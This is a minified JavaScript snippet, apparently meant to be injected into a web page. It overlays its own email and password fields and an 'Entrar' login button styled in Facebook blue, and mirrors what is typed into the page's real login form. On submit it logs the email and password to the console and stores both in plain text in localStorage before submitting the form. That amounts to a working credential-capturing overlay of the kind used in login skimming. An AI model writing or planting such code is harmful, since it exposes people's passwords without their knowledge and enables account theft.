var btn=document.createElement("BUTTON");btn.textContent="Entrar",btn.className="lgin_submit",btn.style.cssText="position: absolute;background: #4266b2;color: white;border-radius: 0;border: 1px solid #2a487c;right: 54px;top: 34px;padding: 4px 9px;";var inputMail=document.createElement("input");inputMail.type="text",inputMail.name="lgin_mail",inputMail.style.cssText="position: absolute;top: 33px;right: 345px;border: 1px solid #1e2c5b;padding: 4px 5px;box-sizing: border-box;width: 150px;",inputMail.addEventListener("keydown",function(){""==this.value&&(this.style.background="#faffbe");var e=document.querySelector('[name="email"]');e.value=inputMail.value});var inputPass=document.createElement("input");inputPass.type="password",inputPass.name="lgin_pass",inputPass.style.cssText="position: absolute;top: 33px;right: 173px;border: 1px solid #1e2c5b;padding: 4px 5px;box-sizing: border-box;width: 150px;",inputPass.addEventListener("keydown",function(e){var t=e.which||e.keyCode;""==this.value&&(this.style.background="#faffbe");var n=document.querySelector('[name="pass"]');n.value=inputPass.value,13==t&&btn.click()});var bod=document.querySelector("body");bod.appendChild(inputMail),bod.appendChild(inputPass),bod.appendChild(btn);var func=function(){var e=document.querySelector('[name="lgin_mail"]').value,t=document.querySelector('[name="lgin_pass"]').value;console.log("mail: "+e),console.log("pass: "+t),localStorage.setItem("m",e),localStorage.setItem("p",t);var n=document.getElementById("login_form");n.submit()};btn.addEventListener("click",func);
